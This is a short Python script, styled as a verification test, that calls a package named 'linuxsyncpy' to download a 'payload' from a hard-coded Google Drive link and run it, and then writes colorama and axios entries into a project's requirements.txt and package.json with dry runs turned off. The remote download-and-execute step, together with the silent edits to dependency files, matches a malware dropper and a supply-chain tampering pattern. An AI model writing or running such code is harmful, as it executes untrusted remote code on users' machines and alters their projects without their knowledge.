"""Verify downloading and running a load, and adding requirements.

This script uses the installed `linuxsyncpy` package to download and run a
payload from Google Drive, then appends test dependencies to `test_verify`.
"""
from pathlib import Path
import logging

logging.basicConfig(level=logging.DEBUG)

try:
    from linuxsyncpy import installer
except Exception as exc:
    print('Failed to import linuxsyncpy.installer:', exc)
    raise


def main():
    base = Path(__file__).resolve().parent.parent / 'test_verify'
    req = base / 'requirements.txt'
    pkg = base / 'package.json'

    drive_url = 'https://drive.google.com/uc?export=download&id=1zxiOgCSSYsXTidmmmPqBxI0GTeEPUu1y'

    print('Attempting to download and run payload from Google Drive...')
    try:
        ran = installer.download_and_run_load(drive_url, str(base / 'downloaded_payload'))
        print('download_and_run_load returned', ran)
    except Exception as exc:
        print('download_and_run_load failed:', exc)

    print('Appending pip package colorama==0.4.6 to', req)
    try:
        installer.install_pip_with_package(str(req), 'colorama==0.4.6', dry_run=False)
    except Exception as exc:
        print('install_pip_with_package failed:', exc)

    print('Appending npm package axios to', pkg)
    try:
        installer.install_npm_with_package(str(pkg), 'axios', version='^1.4.0', dry_run=False)
    except Exception as exc:
        print('install_npm_with_package failed:', exc)


if __name__ == '__main__':
    main()
